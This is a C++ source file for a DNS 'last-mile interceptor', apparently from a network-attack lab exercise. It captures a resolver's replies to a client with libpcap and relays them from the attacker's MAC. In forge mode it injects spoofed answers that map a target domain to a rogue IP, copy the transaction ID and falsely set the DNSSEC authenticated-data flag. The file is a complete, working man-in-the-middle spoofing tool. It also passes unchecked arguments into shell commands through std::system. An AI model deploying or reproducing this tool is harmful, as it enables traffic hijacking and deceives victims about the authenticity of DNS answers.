#define _DEFAULT_SOURCE 1

#include <algorithm>
#include <arpa/inet.h>
#include <cctype>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <iostream>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <pcap.h>
#include <sstream>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

struct DnsHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct Config {
    std::string iface = "eth0";
    std::string client_ip = "172.16.1.10";
    std::string resolver_ip = "172.16.2.10";
    std::string target = "example.com";
    std::string rogue_ip = "172.16.1.30";
    bool forge = false;
    uint8_t attacker_mac[6]{};
    uint8_t client_mac[6]{};
    bool have_client_mac = false;
};

static Config config;
static pcap_t *capture = nullptr;

static uint16_t read_u16(const uint8_t *data) {
    uint16_t value;
    std::memcpy(&value, data, sizeof(value));
    return ntohs(value);
}

static uint16_t internet_checksum(const uint8_t *data, size_t length) {
    uint32_t sum = 0;
    size_t i = 0;
    while (i + 1 < length) {
        sum += static_cast<uint16_t>((data[i] << 8) | data[i + 1]);
        i += 2;
    }
    if (i < length) {
        sum += static_cast<uint16_t>(data[i] << 8);
    }
    while (sum >> 16) {
        sum = (sum & 0xffffU) + (sum >> 16);
    }
    return htons(static_cast<uint16_t>(~sum));
}

static uint16_t udp_checksum(const iphdr *ip, const udphdr *udp,
                             const uint8_t *payload, size_t payload_length) {
    const size_t udp_length = sizeof(udphdr) + payload_length;
    std::vector<uint8_t> buffer(12 + udp_length, 0);

    std::memcpy(buffer.data(), &ip->saddr, 4);
    std::memcpy(buffer.data() + 4, &ip->daddr, 4);
    buffer[9] = IPPROTO_UDP;
    std::memcpy(buffer.data() + 10, &udp->len, 2);
    std::memcpy(buffer.data() + 12, udp, sizeof(udphdr));
    std::memset(buffer.data() + 12 + offsetof(udphdr, check), 0, 2);
    std::memcpy(buffer.data() + 12 + sizeof(udphdr), payload, payload_length);

    uint16_t result = internet_checksum(buffer.data(), buffer.size());
    return result == 0 ? htons(0xffff) : result;
}

static bool interface_mac(const std::string &name, uint8_t mac[6]) {
    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd < 0) return false;

    ifreq request{};
    std::strncpy(request.ifr_name, name.c_str(), IFNAMSIZ - 1);
    const bool ok = ioctl(socket_fd, SIOCGIFHWADDR, &request) == 0;
    close(socket_fd);
    if (ok) std::memcpy(mac, request.ifr_hwaddr.sa_data, 6);
    return ok;
}

static bool parse_mac(const std::string &text, uint8_t mac[6]) {
    unsigned int values[6];
    if (std::sscanf(text.c_str(), "%x:%x:%x:%x:%x:%x",
                    &values[0], &values[1], &values[2],
                    &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (size_t i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(values[i]);
    return true;
}

static bool arp_cache_mac(const std::string &address, uint8_t mac[6]) {
    std::ifstream input("/proc/net/arp");
    std::string line;
    std::getline(input, line);

    while (std::getline(input, line)) {
        std::istringstream fields(line);
        std::string ip, type, flags, hardware, mask, device;
        if (fields >> ip >> type >> flags >> hardware >> mask >> device) {
            if (ip == address && hardware != "00:00:00:00:00:00") {
                return parse_mac(hardware, mac);
            }
        }
    }
    return false;
}

static bool resolve_client_mac() {
    for (int attempt = 0; attempt < 5; ++attempt) {
        if (arp_cache_mac(config.client_ip, config.client_mac)) return true;
        std::string ping = "ping -c 1 -W 1 " + config.client_ip + " >/dev/null 2>&1";
        std::string arping = "arping -c 1 -w 1 -I " + config.iface + " " +
                             config.client_ip + " >/dev/null 2>&1";
        const int ping_status = std::system(ping.c_str());
        const int arping_status = std::system(arping.c_str());
        (void)ping_status;
        (void)arping_status;
        usleep(100000);
    }
    return false;
}

static std::string dns_question_name(const uint8_t *dns, size_t dns_length,
                                     size_t offset, size_t &bytes_read) {
    std::string name;
    size_t current = offset;
    bytes_read = 0;

    while (current < dns_length) {
        const uint8_t label_length = dns[current++];
        if (label_length == 0) {
            bytes_read = current - offset;
            break;
        }
        if ((label_length & 0xc0) != 0 || current + label_length > dns_length) {
            bytes_read = 0;
            return {};
        }
        if (!name.empty()) name += '.';
        name.append(reinterpret_cast<const char *>(dns + current), label_length);
        current += label_length;
    }

    std::transform(name.begin(), name.end(), name.begin(),
                   [](unsigned char value) { return static_cast<char>(std::tolower(value)); });
    return name;
}

static bool packet_layout(const pcap_pkthdr *header, const uint8_t *packet,
                          const iphdr *&ip, const udphdr *&udp,
                          const uint8_t *&dns, size_t &dns_length) {
    if (header->caplen < sizeof(ether_header) + sizeof(iphdr)) return false;
    const auto *ethernet = reinterpret_cast<const ether_header *>(packet);
    if (ntohs(ethernet->ether_type) != ETHERTYPE_IP) return false;

    ip = reinterpret_cast<const iphdr *>(packet + sizeof(ether_header));
    const size_t ip_header_length = ip->ihl * 4U;
    if (ip->version != 4 || ip_header_length < sizeof(iphdr) || ip->protocol != IPPROTO_UDP) {
        return false;
    }
    const size_t udp_offset = sizeof(ether_header) + ip_header_length;
    if (header->caplen < udp_offset + sizeof(udphdr)) return false;

    udp = reinterpret_cast<const udphdr *>(packet + udp_offset);
    const size_t udp_length = ntohs(udp->len);
    if (udp_length < sizeof(udphdr) || header->caplen < udp_offset + udp_length) return false;

    dns = packet + udp_offset + sizeof(udphdr);
    dns_length = udp_length - sizeof(udphdr);
    return dns_length >= sizeof(DnsHeader);
}

static void relay_packet(const uint8_t *packet, size_t length) {
    std::vector<uint8_t> frame(packet, packet + length);
    auto *ethernet = reinterpret_cast<ether_header *>(frame.data());
    std::memcpy(ethernet->ether_dhost, config.client_mac, 6);
    std::memcpy(ethernet->ether_shost, config.attacker_mac, 6);

    auto *ip = reinterpret_cast<iphdr *>(frame.data() + sizeof(ether_header));
    const size_t ip_header_length = ip->ihl * 4U;
    auto *udp = reinterpret_cast<udphdr *>(frame.data() + sizeof(ether_header) + ip_header_length);
    uint8_t *payload = reinterpret_cast<uint8_t *>(udp) + sizeof(udphdr);
    const size_t payload_length = ntohs(udp->len) - sizeof(udphdr);

    ip->check = 0;
    ip->check = internet_checksum(reinterpret_cast<uint8_t *>(ip), ip_header_length);
    udp->check = 0;
    udp->check = udp_checksum(ip, udp, payload, payload_length);

    if (pcap_inject(capture, frame.data(), frame.size()) < 0) {
        std::cerr << "[-] Relay injection failed: " << pcap_geterr(capture) << '\n';
    }
}

static void forge_response(const iphdr *original_ip, const udphdr *original_udp,
                           const uint8_t *original_dns, size_t original_dns_length,
                           size_t qname_length) {
    const size_t question_length = qname_length + 4;
    if (sizeof(DnsHeader) + question_length > original_dns_length) return;

    const size_t answer_length = 16;
    const size_t dns_length = sizeof(DnsHeader) + question_length + answer_length;
    std::vector<uint8_t> dns(dns_length, 0);

    const auto *old_header = reinterpret_cast<const DnsHeader *>(original_dns);
    auto *new_header = reinterpret_cast<DnsHeader *>(dns.data());
    new_header->id = old_header->id;
    const uint16_t old_flags = ntohs(old_header->flags);
    const uint16_t preserved = old_flags & (0x0100U | 0x0010U); // RD and CD
    new_header->flags = htons(static_cast<uint16_t>(0x8000U | 0x0080U | 0x0020U | preserved));
    new_header->qdcount = htons(1);
    new_header->ancount = htons(1);

    std::memcpy(dns.data() + sizeof(DnsHeader),
                original_dns + sizeof(DnsHeader), question_length);

    uint8_t *answer = dns.data() + sizeof(DnsHeader) + question_length;
    answer[0] = 0xc0;
    answer[1] = 0x0c;
    answer[2] = 0x00;
    answer[3] = 0x01; // A
    answer[4] = 0x00;
    answer[5] = 0x01; // IN
    answer[6] = 0x00;
    answer[7] = 0x00;
    answer[8] = 0x02;
    answer[9] = 0x58; // TTL 600
    answer[10] = 0x00;
    answer[11] = 0x04;
    in_addr rogue{};
    inet_pton(AF_INET, config.rogue_ip.c_str(), &rogue);
    std::memcpy(answer + 12, &rogue.s_addr, 4);

    const size_t frame_length = sizeof(ether_header) + sizeof(iphdr) + sizeof(udphdr) + dns_length;
    std::vector<uint8_t> frame(frame_length, 0);

    auto *ethernet = reinterpret_cast<ether_header *>(frame.data());
    std::memcpy(ethernet->ether_dhost, config.client_mac, 6);
    std::memcpy(ethernet->ether_shost, config.attacker_mac, 6);
    ethernet->ether_type = htons(ETHERTYPE_IP);

    auto *ip = reinterpret_cast<iphdr *>(frame.data() + sizeof(ether_header));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = original_ip->tos;
    ip->tot_len = htons(sizeof(iphdr) + sizeof(udphdr) + dns_length);
    ip->id = original_ip->id;
    ip->ttl = original_ip->ttl;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = original_ip->saddr;
    ip->daddr = original_ip->daddr;
    ip->check = internet_checksum(reinterpret_cast<uint8_t *>(ip), sizeof(iphdr));

    auto *udp = reinterpret_cast<udphdr *>(frame.data() + sizeof(ether_header) + sizeof(iphdr));
    udp->source = original_udp->source;
    udp->dest = original_udp->dest;
    udp->len = htons(sizeof(udphdr) + dns_length);

    uint8_t *payload = reinterpret_cast<uint8_t *>(udp) + sizeof(udphdr);
    std::memcpy(payload, dns.data(), dns.size());
    udp->check = udp_checksum(ip, udp, payload, dns_length);

    if (pcap_inject(capture, frame.data(), frame.size()) < 0) {
        std::cerr << "[-] Forge injection failed: " << pcap_geterr(capture) << '\n';
        return;
    }

    std::cout << "[+] Forged last-mile reply: " << config.target << " -> "
              << config.rogue_ip << ", AD=1, TXID=0x" << std::hex
              << ntohs(new_header->id) << std::dec << '\n';
}

static void handle_packet(u_char *user, const pcap_pkthdr *header, const u_char *packet) {
    (void)user;
    const iphdr *ip = nullptr;
    const udphdr *udp = nullptr;
    const uint8_t *dns = nullptr;
    size_t dns_length = 0;
    if (!packet_layout(header, packet, ip, udp, dns, dns_length)) return;

    const auto *dns_header = reinterpret_cast<const DnsHeader *>(dns);
    size_t qname_length = 0;
    const std::string qname = dns_question_name(dns, dns_length, sizeof(DnsHeader), qname_length);
    if (qname_length == 0 || sizeof(DnsHeader) + qname_length + 4 > dns_length) {
        relay_packet(packet, header->caplen);
        return;
    }

    const uint16_t qtype = read_u16(dns + sizeof(DnsHeader) + qname_length);
    const bool target = config.forge && qname == config.target && qtype == 1 &&
                        ntohs(dns_header->ancount) > 0;

    if (target) {
        forge_response(ip, udp, dns, dns_length, qname_length);
    } else {
        relay_packet(packet, header->caplen);
    }
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; ++i) {
        const std::string argument = argv[i];
        if (argument == "--forge") config.forge = true;
        else if (argument == "--relay") config.forge = false;
        else if (argument == "--iface" && i + 1 < argc) config.iface = argv[++i];
        else if (argument == "--target" && i + 1 < argc) config.target = argv[++i];
        else if (argument == "--ip" && i + 1 < argc) config.rogue_ip = argv[++i];
        else if (argument == "--client-mac" && i + 1 < argc) {
            config.have_client_mac = parse_mac(argv[++i], config.client_mac);
        } else {
            std::cerr << "Usage: interceptor [--relay|--forge] [--client-mac MAC] "
                         "[--iface IFACE] [--target NAME] [--ip ADDRESS]\n";
            return 2;
        }
    }

    std::cout.setf(std::ios::unitbuf);
    std::cout << "=== Phase 6 last-mile interceptor ===\n"
              << "Mode: " << (config.forge ? "FORGE" : "TRANSPARENT RELAY") << '\n'
              << "Path: resolver " << config.resolver_ip << " -> client " << config.client_ip << '\n';

    if (!interface_mac(config.iface, config.attacker_mac)) {
        std::cerr << "[-] Could not read the attacker interface MAC.\n";
        return 1;
    }
    if (!config.have_client_mac && !resolve_client_mac()) {
        std::cerr << "[-] Could not resolve the client MAC.\n";
        return 1;
    }

    char error[PCAP_ERRBUF_SIZE];
    capture = pcap_open_live(config.iface.c_str(), 65535, 1, 1, error);
    if (!capture) {
        std::cerr << "[-] pcap_open_live failed: " << error << '\n';
        return 1;
    }
    if (pcap_setdirection(capture, PCAP_D_IN) == -1) {
        std::cerr << "[-] pcap_setdirection failed: " << pcap_geterr(capture) << '\n';
        return 1;
    }

    const std::string filter = "udp and src host " + config.resolver_ip +
                               " and src port 53 and dst host " + config.client_ip;
    bpf_program program{};
    if (pcap_compile(capture, &program, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) == -1 ||
        pcap_setfilter(capture, &program) == -1) {
        std::cerr << "[-] Could not install capture filter: " << pcap_geterr(capture) << '\n';
        pcap_close(capture);
        return 1;
    }
    pcap_freecode(&program);

    std::cout << "[+] Ready on " << config.iface << "; filter: " << filter << '\n';
    pcap_loop(capture, -1, handle_packet, nullptr);
    pcap_close(capture);
    return 0;
}
